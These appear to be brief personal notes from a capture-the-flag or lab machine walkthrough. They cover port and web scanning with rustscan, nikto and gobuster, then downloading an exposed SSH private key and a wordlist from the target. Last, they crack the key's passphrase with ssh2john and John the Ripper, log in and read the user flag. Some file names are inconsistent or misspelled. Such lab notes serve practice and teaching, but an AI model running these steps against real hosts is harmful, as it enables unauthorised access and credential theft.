10.145.188.158
rust-scan: look for open ports

nikto -h "http://IP" | tee nikto.log

gobuster dir -u http://IP -w /opt/directory-list-2.3-medium.txt

Now go to web poke around

Ctrl U to view source code

click upload: open some files

manifesto.txt 

wget "http://IP/uploads/dict.lst"
cat dict.lst

nikto will now review robot.txt
go to IP/robot.txt

gobuster found upload and secret
go to secret and we have secretkey
wget sceretkey

chmod 600 secretKey
ssh -i secretkey john@IP

/opt/JohnTheRipper/run/ssh2john.py secretKey > for_john.txt
/opt/JohnTheRipper/run/john for_john.txt --wordlist=dic.lst

should review password

ssh -i ... again
put password in

ls 
cat txt => should review user flag
